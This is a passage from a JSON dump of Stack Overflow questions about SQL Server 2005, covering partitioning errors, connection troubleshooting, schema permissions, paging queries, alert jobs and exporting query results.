xDocumentsUsers</p>\n\n<pre><code>DocID..UserID....Type...\n1........386......approver\n1........346......reviewer\n1........394......reviewer..\n1........519......reviewer..\n4........408......reviewer..\n5........408......reviewer..\n6........408......reviewer..\n7........386......approver..\n7........111......readdone..\n7........346......reviewer..\n8........386......approver..\n8........346......reviewer..\n9........386......approver..\n9........346......reviewer..\n10.......386......approver..\n11.......386......approver..\n11......346......reviewer..\n12......386......approver..\n12......346......reviewer..\n13......386......approver..\n13......346......reviewer..\n14......386......approver..\n14......346......reviewer..\n15......386......approver\n</code></pre>\n\n<p>So desired result would be...</p>\n\n<p><b>DocID..UserID................Type...</b></p>\n\n<pre><code>1........386....................approver\n1........346,394,519......reviewer.\n4........408....................reviewer..\n5........408....................reviewer..\n6........408....................reviewer..\n7........386....................approver..\n7........111....................readdone..\n7........346....................reviewer..\n8........386....................approver..\n8........346....................reviewer..\n9........386....................approver..\n9........346....................reviewer..\n10......386....................approver..\n11......386....................approver..\n11......346....................reviewer..\n12......386....................approver..\n12......346....................reviewer..\n13......386....................approver..\n13......346....................reviewer..\n14......386....................approver..\n14......346....................reviewer..\n15......386....................approver\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12819208,"title":"select data from another database","body":"<p>I work with a database db1 ,and i have a stocked procedure that select data from another database like that </p>\n\n<blockquote>\n<pre><code>select name from db2..table\n</code></pre>\n</blockquote>\n\n<p>the same code work fine in other machine but not in mine\nI tink this is a probleme with user privileges in sql-server.\nTanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","try-catch"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12816539,"title":"SQL TRY-CATCH and the missing columns","body":"<p>I have the following (SQL Server 2005)</p>\n\n<pre><code>DECLARE @L_ID_FOO_BAR INT\n\nBEGIN TRY\n  SELECT @L_ID_FOO_BAR = IDFOO \n  FROM BAR\n  WHERE IDFOO = 5\nEND TRY\nBEGIN CATCH\n  SELECT @L_ID_FOO_BAR = NULL\nEND CATCH\n</code></pre>\n\n<p>in the BAR table I could have (on old databases) or not (in some more recennt databases) the IDFOO column. So, for the missing IDFOO column I'd like to leave @L_ID_FOO_BAR = NULL, in case if that column exists select the respective IDFOO.</p>\n\n<p>However, when executing the script on bases without that column I obtain:</p>\n\n<blockquote>\n  <p>Invalid column name: 'IDFOO'</p>\n</blockquote>\n\n<p>I already surrounded the script with </p>\n\n<pre><code>IF EXISTS(SELECT 1 FROM SYSCOLUMNS \nWHERE ID = OBJECT_ID('BAR') AND NAME = 'IDFOO') \n</code></pre>\n\n<p>but this didn't help, it complains about the invalid column...</p>\n\n<p>Questions<br>\na) <strong>What to do</strong> to make work this script on both databases, with or without that column?<br>\nb) <strong>Why</strong> does try-catch not hide the invalid column error?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","schema"],"answer_count":4,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":7848,"score":10,"question_id":316485,"title":"rename schema in SQL server 2005","body":"<p>How can I rename a schema in SQL Server 2005? </p>\n"},{"tags":["sql-server-2005","database-design"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":219,"score":0,"question_id":12451826,"title":"SQL Table Partition Error - Cannot Add A New Partition To Existing Partitioned Table","body":"<p>I have inherited a SQL Server and I have discovered a table partitioning issue.  I cannot add a new partition to an existing table partition for reasons I am unsure of.  </p>\n\n<p><strong>Environment:</strong></p>\n\n<p>SQL Server 2005 Enterprise,\nDatabase approximately 400GB in size,\n4GB RAM,\n32 BIT system only.</p>\n\n<p><strong>Partitioned Table Details:</strong></p>\n\n<p>*Table is partitioned across 13 filegroups on multiple disk volumes.</p>\n\n<p>*Partition Function is RANGE LEFT with 12 boundary points that are datetime values.</p>\n\n<p>*Boundary points are structured in a date quarterly structure (example: 2009-12-31 23:59:59, 2010-03-31 23:59:59, 2010-06-30 23:59:59).</p>\n\n<p>*The datetime value is the Partition Key.</p>\n\n<p>*Data is inserted daily into the table based on the current date, however only the last filegroup receives data as the last boundary point on the function is '2010-06-30 23:59:59'.</p>\n\n<p>*Table has a Clustered Index that is aligned with the table, and 3 Non-Unique Non-Clustered Indexes (2 are aligned, 1 exists on a different filegroup altogether).</p>\n\n<p>*Current Table volume details:</p>\n\n<p>Data Space: 75GB+</p>\n\n<p>Index Space:    50GB+</p>\n\n<p>Row Count:  200 million+</p>\n\n<p><strong>Issue:</strong></p>\n\n<p>Currently the last filegroup/partition has no maximum date boundary point, so all data after the date '2010-06-30 23:59:59' has been/is still being inserted into this partition.  Luckily transactional data volumes are rather small, however over a two year period the final partition has grown to an impressive 22GB size.  I do not wish to split or remove data from this existing partition.  I do however want to add a new filegroup and alter the existing partition function so that all future data is inserted into the new filegroup.  I want to add a new future date as a boundary point so that all inserted data after that date goes to a new filegroup/partition.</p>\n\n<p><strong>Method Used:</strong></p>\n\n<p>Added a new filegroup/file using the ALTER DATABASE function - <em>SUCCESS</em>.</p>\n\n<p>Altered the Partition Scheme so that the newly created filegroup was allocated 'NEXT USED' - <em>SUCCESS</em>.\n--SCRIPT USED TO ALTER PARTITION SCHEME--</p>\n\n<p>ALTER PARTITION SCHEME [partition_scheme_name]\nNEXT USED (new_filegroup_name);</p>\n\n<p>Altered the Partition Function to add the new boundary point - <em>FAIL</em>.</p>\n\n<p>--SCRIPT USED TO ADD NEW BOUNDARY POINT TO FUNCTION--</p>\n\n<p>ALTER PARTITION FUNCTION partition_function_name()\nSPLIT RANGE ('2012-10-01 23:59:59)\nGO</p>\n\n<p><strong>Error:</strong></p>\n\n<p>Adding the new boundary point to the existing partition using the SPLIT RANGE technique failed because the database transaction log filled up (restricted to 18GB).  This took me by surprise for 2 reasons - 1): I thought using SPLIT RANGE was a metadata function only (please correct me if I am wrong) and 2): my new boundary point does not exist in the table as yet as a date value so I assumed there would be no data movement.</p>\n\n<p><strong>What I have tried so far:</strong></p>\n\n<p>*I tested this method successfully using a test server but with a much smaller dataset.</p>\n\n<p>*I then restored a complete copy of the production database onto a test system.  I added a second database log file with unlimited growth and attempted to alter the Partition Function again.  The original database transaction log filled up as expected, but the secondary database transaction log grew to 60GB!  In addition the tempdb grew to 14GB.  The new filegroup started to increase in size when the whole process aborted again due to a different error.  This time the error was:</p>\n\n<p>('Cannot insert duplicate key row in object 'table_name' with unique index 'Index_name').</p>\n\n<p>Now there are TWO things that completely puzzle me here:</p>\n\n<p>1): The index mentioned in the error from testing is a Non-Clustered, Non-Unique Index - why would I get a duplicate error?</p>\n\n<p>2): More to the point, I am adding a new datetime value as a new maximum boundary point and this value does not exist in the table yet.  Why would there be data movement???</p>\n\n<p>As said I have tested this method using a much smaller data set and it worked perfectly.  I don't understand why it will not work with the production dataset.  Am I missing something very obvious here?  Any advice is greatly appreciated.  Thank you for your time.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-express","sqlcmd","sql-server-native-client"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1271,"score":0,"question_id":5803326,"title":"sqlcmd not working after installing sql server 2005 express","body":"<p>I downloaded the 53.5 MB setup of SQL Server 2005 Express from this URL:  </p>\n\n<p><a href=\"http://www.microsoft.com/downloads/en/details.aspx?familyid=220549B5-0B07-4448-8848-DCC397514B41&amp;displaylang=en\" rel=\"nofollow\">http://www.microsoft.com/downloads/en/details.aspx?familyid=220549B5-0B07-4448-8848-DCC397514B41&amp;displaylang=en</a></p>\n\n<p>Then I ran sqlcmd by going into command promp , but it shows error</p>\n\n<blockquote>\n  <p>HResult 0x2, Level 16, State 1<br>\n  Named Pipes Provider: Could not open a connection to SQL Server [2].<br>\n  Sqlcmd: Error: Microsoft SQL Native Client : An error has occurred\n  while establishing a connection to the server. When connecting to SQL Server 2005,\n  this failure may be caused by the fact that under the default settings SQL Server\n  does not allow remote connections..</p>\n  \n  <p>Sqlcmd: Error: Microsoft SQL Native Client : Login timeout expired.</p>\n</blockquote>\n\n<p>Then I downloaded and installed Sql Command Line Utility from this URL: </p>\n\n<p><a href=\"http://www.microsoft.com/downloads/en/details.aspx?FamilyID=d09c1d60-a13c-4479-9b91-9e8b9d835cdc&amp;displaylang=en\" rel=\"nofollow\">http://www.microsoft.com/downloads/en/details.aspx?FamilyID=d09c1d60-a13c-4479-9b91-9e8b9d835cdc&amp;displaylang=en</a></p>\n\n<p>Then also it shows the same error.</p>\n\n<p>Then I installed Sql Native Client, then also it didn't work. But when I installed Management Studio, then from Management Studio the connection is established, but not from sqlcmd from Command Prompt. </p>\n\n<p>Please help. </p>\n"},{"tags":["sql","sql-server-2005","jobs"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12563692,"title":"sql server 2005 - Create job to check if a particular data in a column exists","body":"<p>I want to check a sql server 2005 database table if a range of data in the column exists and this is to be checked on an hourly basis.</p>\n\n<p>If it exists I will want to trigger an email to users.The email will say that the range that was specified by the user exists</p>\n\n<p>I am trying the following procedure at the moment</p>\n\n<pre><code>DECLARE @xml NVARCHAR(MAX)\nDECLARE @body NVARCHAR(MAX)\n\nSET @xml = CAST(( SELECT [No] AS 'td','',[date] AS 'td','',\n                  [DAYS] AS 'td','', Variance AS 'td'\nFROM  TestTbl \nWHERE(Variance &gt;= @Start AND Variance &lt; @End)\nAND CAST(CONVERT(VARCHAR,curDate,106) AS DATETIME) = CAST(@Date AS DATETIME)\nORDER BY No \nFOR XML PATH('tr'), ELEMENTS ) AS NVARCHAR(MAX))\n\nSET @body ='&lt;html&gt;&lt;body&gt;&lt;H3&gt;test Report&lt;/H3&gt;\n&lt;table border = 1&gt; \n&lt;tr&gt;\n&lt;th&gt; No &lt;/th&gt; &lt;th&gt; date &lt;/th&gt; &lt;th&gt; DAYS &lt;/th&gt; &lt;th&gt; Variance &lt;/th&gt;&lt;/tr&gt;'    \n\nSET @body = @body + @xml +'&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;'\n</code></pre>\n\n<p>Every hour I want the database to be checked for the data range ...If it exists I want to trigger an email based on the condition</p>\n\n<p>Thanks</p>\n"},{"tags":["java","sql-server-2005","jsp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12811737,"title":"HTTP Status 500 error. Eclipse+Tomcat+MS SQL 2005","body":"<p>I am trying this code in order for me to understand how to connect MS SQL 2005 to Eclipse and Tomcat 7 as my server. I am just new in making a java web application so please bear with me. In the error below, how can i trace where is the cause of the error? The project have 2 jsp, and 3 class files. <code>index.jsp</code>, <code>result.jsp</code>, <code>SQLConnection.java</code>, <code>Items.java</code> and <code>ItemController.java</code>.</p>\n\n<p><strong>The error goes like this,</strong></p>\n\n<pre><code>type Exception report\n\nmessage \n\ndescription The server encountered an internal error () that prevented it from    fulfilling this request.\n\nexception \n\norg.apache.jasper.JasperException: java.lang.NullPointerException\n      org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:549)\norg.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)\norg.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)\norg.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:722)\n\n\nroot cause \n\njava.lang.NullPointerException\nconnection.SQLConnection.execSelectQuery(SQLConnection.java:35)\nmodel.Item.lastItems(Item.java:10)\norg.apache.jsp.index_jsp._jspService(index_jsp.java:83)\norg.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:722)\norg.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)\norg.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)\norg.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:722)\n</code></pre>\n\n<p>The code for SQLConnection.java and index.jsp are as follows;</p>\n\n<p>SQLConnection.java</p>\n\n<pre><code>    package connection;\n    import java.sql.*;\n    public class SQLConnection {\n    protected Connection con=null;\n    protected ResultSet rs=null;\n\n    public SQLConnection(String address)\n    {\n        try\n    {\n    String conString = \"jdbc:sqlserver://localhost:1433;databaseName=Chingdb;    integratedSecurity=true;\";\ncon = DriverManager.getConnection(conString);\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\n}\n}\npublic boolean execQuery(String sql)\n{\nboolean result = false;\ntry\n{\nStatement stmt = con.createStatement();\nstmt.execute(sql);\nresult = true;\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\nresult = false;\n}\nreturn result;\n}\npublic void execSelectQuery(String sql)\n{\ntry\n{\nStatement stmt = con.createStatement();\nthis.rs = stmt.executeQuery(sql);\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\n}\n}\npublic void disconnect()\n{\ntry\n{\ncon.close();\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\n}\n\n}\n}\n</code></pre>\n\n<p>index.jsp</p>\n\n<pre><code>&lt;%@ page language=\"java\" contentType=\"text/html; charset=ISO-8859-1\" pageEncoding=\"ISO-8859-1\"%&gt;\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org    /TR/html4/loose.dtd\"&gt;\n&lt;%@page import=\"model.Item\"%&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"&gt;\n&lt;title&gt;Todo-List App&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h2&gt;Add a new item&lt;/h2&gt;\n&lt;form action=\"addItem\" method=\"post\"&gt;\n&lt;table&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;input type=\"text\" value=\"I have to...\" onClick=\"this.value('')\" name=\"todo\"/&gt;&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"submit\" value=\"Send\" name=\"send\"/&gt; &lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n&lt;/form&gt;\n&lt;h2&gt;Todo-List&lt;/h2&gt;\n&lt;%\nItem item = new Item();\nString[] lastest = item.lastItems();\nfor(int i=0;i&lt;lastest.length;i++)\n{%&gt;\n&lt;%=lastest[i] %&gt; &lt;br&gt;\n&lt;%}item.disconnect();\n%&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["windows","sql-server-2005","tomcat","waffle","sqljdbc"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":12804614,"title":"restarting tomcat after redeploying a web application","body":"<p>Hi I'm using tomcat and using Waffle for windows authentication.  I'm also connecting to an SQL server using the windows credentials too using microsoft's driver.  I have a problem that everytime I reload or redeploy the application, i have to restart tomcat.  After some googling i've discovered that the dll was already loaded and thus cannot be reloaded.</p>\n\n<p>I really need to redeploy application as i would need to update some functionality and it is very frustrating to ask the administrator to restart tomcat everytime i update the application.</p>\n\n<p>When i was doing the same with glassfish i managed to work around this issue somehow, but cannot manage with tomcat</p>\n"},{"tags":["sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12784211,"title":"Move SQL Server database modification between development and live database without data","body":"<p>I am working with SQL Server and I have two databases - one for development and another one for a live users.</p>\n\n<p>I want a way to move the changes (create new tables, SP, functions, modifications, relations, indexes) from development database to a live database automatically</p>\n\n<p>now I am copy the script for each element and execute it on the live database</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","text","nvarchar"],"answer_count":6,"favorite_count":5,"up_vote_count":42,"down_vote_count":0,"view_count":12576,"score":42,"question_id":2133946,"title":"nvarchar(max) vs NText","body":"<p>What are the advantages and disadvantages of using the <code>nvarchar(max)</code> vs. <code>NText</code> data types in SQL Server? I don't need backward compatibility, so it is fine that <code>nvarchar(max)</code> isn't supported in older SQL Server releases.</p>\n\n<p><strong>Edit:</strong> Apparently the question also applies to <code>TEXT</code> and <code>IMAGE</code> vs. <code>varchar(max)</code> and <code>varbinary(max)</code>, for those searching for those data-types later.</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12801308,"title":"TSQL get all orders that have specific code in history","body":"<p>I have a table that holds status changes for orders:</p>\n\n<pre><code>ORDER_ID  |  CHANGE_DATE      |  CODE_1  |  CODE_2  |  CODE_3\n=============================================================\n1         |  2012-09-01 12:20 |  Z1      |  NULL    |  NULL\n1         |  2012-09-01 12:21 |  Z2      |  S01     |  NULL\n1         |  2012-09-01 12:22 |  Z2      |  S04     |  NULL\n2         |  2012-09-01 12:22 |  Z1      |  S01     |  NULL\n3         |  2012-09-01 12:23 |  Z1      |  S03     |  NULL\n1         |  2012-09-01 12:24 |  Z1      |  S02     |  NULL\n2         |  2012-09-01 12:29 |  Z1      |  S05     |  NULL\n1         |  2012-09-01 13:29 |  Z5      |  T01     |  X01\n2         |  2012-09-01 13:31 |  Z1      |  T01     |  NULL\n</code></pre>\n\n<p>I need to select ORDER_ID for every order that has in history CODE_2 IN (S01,S02,S03) but don't have S04 and S05 after them.</p>\n\n<p>In this specific case query should return order 1 because after CODE_2 there is no S04 and S05, please notice that order 1 had S04 in history, but after that it had code S02.\nIt should also return order 3 because of code S03.\nOrder 2 shouldn't be returned because last code in his history is S05 (last from S group).</p>\n\n<p>Can I do this without joining to other table? I would like to select ORDER_ID only from this table.</p>\n"},{"tags":["sql","sql-server-2005","tsql","sql-server-2008","format"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2511,"score":3,"question_id":6469683,"title":"Format() function doesn't work?","body":"<p>I am trying to execute following built-in function in sql but it gives me error that this  function doesn't exist </p>\n\n<p>my query:</p>\n\n<pre><code>select EmpId, EmpName, format(EmpJoinDate, \"YYYY-DD-MM\") as date from Employee\n</code></pre>\n\n<p>Error i am getting:</p>\n\n<pre><code>'format' is not a recognized built-in function name\n</code></pre>\n\n<p>What may be  the problem, or what am i doing wrong? </p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":27,"score":-3,"question_id":12800947,"title":"create table for more categories","body":"<blockquote>\n  <p>I need to know the suitable way to create table with these info(<strong>ID\n  Category  Subcategory</strong>) .</p>\n  \n  <p>as the category have more subcategories , but also i can add new sub ,\n  sub category in the future , I tried to create to two table for \n  category and subcategory but I will face vital problem on the future \n  when I need to add new sub sub category .</p>\n  \n  <p><strong>So how can solve this issue?</strong></p>\n</blockquote>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":611,"score":0,"question_id":6223838,"title":"How to convert rows values into column in sql server 2005","body":"<p>How to convert row into column.I have following result set.</p>\n\n<pre><code>UserID  VendorName  QuestionText AnswerText\n1         KK         abc1         ans1\n1         KK         abc2         ans2\n1         KK         abc3         ans3\n2         JJ         abc1         ans2\n2         JJ         abc2         ans3\n2         JJ         abc3         ans1   \n</code></pre>\n\n<p>OUTPUT should be:</p>\n\n<pre><code>UserID VendorName   abc1    abc2   abc3\n1             KK    ans1    ans2   ans3\n2             JJ    ans2    ans3   ans1\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12384014,"title":"Create Scheduled Job in SQL Server that checks for an alert condition in table data","body":"<p>How do I setup a scheduled job on SQL Server database that checks for an alert \ncondition say change in the table column variance and executes a cmd that sends an email \nalert when data in the variance column is in the 10-15 range</p>\n\n<p>The columns in the database tables will be dynamic...the user must be able to select and set alert on any of the database table columns dynamically and check for an alert condition</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","alter-table","notnull"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12799636,"title":"SQL Server: set varchar to not null when column size is unknown","body":"<p>I'm trying to create a script that when run against a DB takes a column and sets it to NOT NULL.</p>\n\n<p>The column is supposed to be a VARCHAR(50), and if I knew it hadn't been changed this would be a piece of cake, However, I can't be certain that no one has altered the length, so I need to make sure I don't reduce the size of the column if for example it's been increased to 100 by someone else.</p>\n\n<p>I was hoping I could do something like this, but it doesn't seem to work (assume I've already made sure there are no NULL values):</p>\n\n<pre><code>DECLARE @myColumnLength INT\n\nSET @myColumnLength = (\n    SELECT character_maximum_length\n    FROM information_schema.columns\n    WHERE table_name = 'mytable'\n    AND column_name = 'mycolumn'\n)\n\nALTER TABLE mytable\n    ALTER COLUMN mycolumn VARCHAR(@myColumnLength) NOT NULL \n</code></pre>\n\n<p>Any ideas? Am I attacking the problem in a wrong way? It would seem logical there'd be a way to set a column to NOT NULL without altering the column size, but my Google-fu is failing me today.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2","information-schema"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12793070,"title":"Deny access to information schema in SQL Server","body":"<p>I am looking for the best way to disable access to the <code>sys.tables</code> / <code>Information Schema</code> for a user / group in SQL Server.</p>\n\n<p>I found <a href=\"http://www.derkeiler.com/Newsgroups/microsoft.public.sqlserver.security/2008-09/msg00088.html\" rel=\"nofollow\">this thread from 2008 </a></p>\n\n<p>It shows a way how to deny access on <code>[sys].[something]</code> like so:</p>\n\n<pre><code> DENY SELECT ON [sys].[columns] TO DenySystemTableSelectRole\n GO\n DENY SELECT ON [sys].[tables] TO DenySystemTableSelectRole\n GO\n DENY SELECT ON [sys].[syscolumns] TO DenySystemTableSelectRole\n GO\n DENY SELECT ON [sys].[sysobjects] TO DenySystemTableSelectRole\n GO\n</code></pre>\n\n<p>But no way how to disable access on the <code>Information Schema</code>:</p>\n\n<pre><code>DENY SELECT ON INFORMATION_SCHEMA.TABLES To DenySystemTableSelectRole\n</code></pre>\n\n<p>This seems not to work.</p>\n\n<p>How can I disable access to information_schema?</p>\n\n<p>And is there an easier way disable access to all <code>sys</code> / <code>information_schema</code>?</p>\n\n<p><strong>Update:</strong>\nActually I can not run both ot the following statements:</p>\n\n<pre><code>DENY SELECT ON [sys] TO reducedDBO\nGO\nDENY SELECT ON INFORMATION_SCHEMA To reducedDBO\nGO\n</code></pre>\n\n<p>I tried to run them on the specific DB where the User exists, and I also tried on the \"master\".</p>\n\n<p>I still can run:</p>\n\n<pre><code> SELECT * from\n INFORMATION_SCHEMA.TABLES \n</code></pre>\n\n<p>-->still returns results</p>\n\n<pre><code> SELECT * from\n sys.TABLES \n</code></pre>\n\n<p>-->no results anymore</p>\n\n<p>Including <code>SCHEMA::</code> in the query made it possible to create the securables</p>\n\n<pre><code>DENY SELECT ON SCHEMA::[sys] TO reducedDBO\nGO\nDENY SELECT ON SCHEMA::INFORMATION_SCHEMA To reducedDBO\nGO\n</code></pre>\n\n<p>But now I still can select all the information from the DB.</p>\n\n<p>I had a look at the \"Securables\"-Tab in the users Property-window in Management Studio 2008, it looks like this:</p>\n\n<p><em>Entry that does block the selecion of sys.tables</em></p>\n\n<p>Schema:sys, Name:tables, Type:View </p>\n\n<p>Permissions for sys.tables: Permission:Select, Grantor:dbo, Deny is checked</p>\n\n<p><em>Entry that do not block any selection</em></p>\n\n<p>Schema:, Name:INFORMATION_SCHEMA, Type:Schema </p>\n\n<p>Permissions for INFORMATION_SCHEMA: Permission:Select, Grantor:dbo, Deny is NOT checked (I tried to check it, but no chance..)</p>\n\n<p>Permission:Select, Grantor:INFORMATION_SCHEMA, Deny is checked</p>\n\n<hr>\n\n<p>I tried to set the permissions over the GUI, but then I get the same error that setting permissions would be possible only on the master DB.\nBut I not have the user/login added to the master DBs security.</p>\n\n<p><strong>Solution:</strong></p>\n\n<p>The only way I could make the <code>deny</code> work for the <code>information_schema</code> was to <strong>add the user to the master-db</strong> and run the <code>deny select</code> on the master:</p>\n\n<pre><code>DENY SELECT ON [sys].[tables] TO reducedDBO\nGO\nDENY SELECT ON INFORMATION_SCHEMA.TABLES To reducedDBO\nGO\n</code></pre>\n\n<p>And as in this code, it can only be executed for single tables.</p>\n"},{"tags":["sql-server","sql-server-2005","character-encoding","ssms","rpt"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":2256,"score":6,"question_id":10538162,"title":"Convert SSMS .rpt output file to .txt/.csv","body":"<p>I want to export my big SSMS (SQL Server Management Studio) query result (2.5m lines, 9 fields) as .csv or comma-delimited .txt (with headings). (MS SQL Server 2005 Management Studio.)</p>\n\n<p>So that I can then either read it line-by-line into VBA program (to do certain calculations on the data) or do queries on it in Excel (e.g. with Microsoft Query). The calculations are complicated and I prefer to do it somewhere else than SSMS. </p>\n\n<p>If I choose query result to text in SSMS and a small answer (few lines e.g. up to 200k) I could of course simply copy and paste to a text editor. For my large answer here I could of course copy and paste 200k or so lines at a time, 10 times, into a text editor like Ultra-Edit. (When I try all 2.5m at once, I get a memory warning inside SSMS.) But for the future Id like a more elegant solution.</p>\n\n<p>For query result to file, SSMS writes to an .rpt file always.  (When you right-click in the results window and choose save as, it gives a memory error just like above.) </p>\n\n<p>--> So it looks like my only option is to have SSMS output its result to a file i.e. .rpt and then afterwards, convert the .rpt to .txt.</p>\n\n<p>I assume this .rpt is a Crystal Reports file? Or isn't it. I dont have Crystal Reports on my PC, so I cannot use that to convert the file.</p>\n\n<p>When opening the .rpt in Ultra-Edit it looks fine. However in Microsoft Query in Excel, the headings doesnt want to show.</p>\n\n<p>When I simply read &amp; write the .rpt using VBA, the file halves in size. (330meg to 180meg). In Microsoft Query the headings do show now (though the first field name has a funny leading character, which has happened to me before in other totally different situations). I do seem to be able to do meaningful pivot tables on it in Excel.</p>\n\n<p>However when I open this new file in Ultra-Edit, it shows Chinese characters! Could there still be some funny characters in it somewhere?</p>\n\n<p>--> Is there perhaps a free (and simple/ safe) converter app available somewhere. Or should I just trust that this .txt is fine for reading into my VBA program.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","paging"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12774625,"title":"Paging in SQL Server problems","body":"<p>I have searched for paging in SQL Server. I found most of the solution look like that</p>\n\n<p><a href=\"http://stackoverflow.com/questions/109232/what-is-the-best-way-to-paginate-results-in-sql-server\">What is the best way to paginate results in SQL Server</a></p>\n\n<p>But it don't meet my expectation. </p>\n\n<p>Here is my situation:</p>\n\n<p>I work on JasperReport, for that: to export the report I just need pass the any Select query into the template, it will auto generated out the report</p>\n\n<p>EX : I have a select query like this: </p>\n\n<pre><code>Select * from table A\n</code></pre>\n\n<p>I don't know any column names in table A. So I can't use </p>\n\n<pre><code>Select ROW_NUMBER() Over (Order By columsName)\n</code></pre>\n\n<p>And I also don't want it order by any columns.</p>\n\n<p>Anyone can help me do it?</p>\n\n<p>PS: In Oracle , it have rownum very helpful in this case.</p>\n\n<pre><code>Select * from tableA where rownum &gt; 100 and rownum &lt;200\n</code></pre>\n\n<p><a href=\"http://stackoverflow.com/questions/241622/paging-with-oracle\">Paging with Oracle</a></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":12790685,"title":"SQL Server 2005 Query for getting multiple records which have same pattern in QC project database","body":"<p>We access the SQL Server 2005 server from the QC Application.</p>\n\n<p>In order to access the data present in the SQL Server 2005 server we use the Dash Board Module in Quality Center Application.</p>\n\n<p>Sorry I could not post images as I am a fresher to stackoverflow.</p>\n\n<p>When I execute the below query I recieved two rows as output.</p>\n\n<pre><code>SELECT *\nFROM CYCL_FOLD\nWHERE CF_ITEM_NAME LIKE  '%Quality Center%'\n</code></pre>\n\n<p>When I parameterised the entity and when I am using LIKE cause it is returning only row.</p>\n\n<pre><code>SELECT *\nFROM CYCL_FOLD\nWHERE CF_ITEM_NAME LIKE   @FOLDER_NAME@\n</code></pre>\n\n<p>Please let me know how to get multiple rows using like clause.</p>\n"},{"tags":["php","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12791035,"title":"How can I connect to a remote SQL Server 2005 database using PHP/PDO?","body":"<p>I'm using the following code:</p>\n\n<pre><code>$serverName = \"&lt;specific_name&gt;.domain.com.au\\&lt;instancename&gt;\";\n\ntry{\n    $conn = new PDO( \"sqlsrv:Server=$serverName;Database=&lt;dbname&gt;\", \"\", \"\");\n    $conn-&gt;setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );\n}\ncatch(Exception $e)     {\n    die( print_r( $e-&gt;getMessage() ) );\n}\n\ninclude_once('&lt;success_view&gt;');\n</code></pre>\n\n<p>I'm getting the following error:</p>\n\n<pre><code>SQLSTATE[08001]: [Microsoft][SQL Server Native Client 10.0]Named Pipes Provider: Could not open a connection to SQL Server [53]. 1\n</code></pre>\n\n<p>I can ping the DB server, and it has Windows authentication enabled (which is why I'm providing blank user/pass. Wouldn't work even with a specific account, though.)  I checked that the server also has named pipes enabled (1. Shared memory 2. Named Pipes 3.TCP/IP).</p>\n\n<p>I'm using PHP 5.3.9 on IIS7/Windows 7. 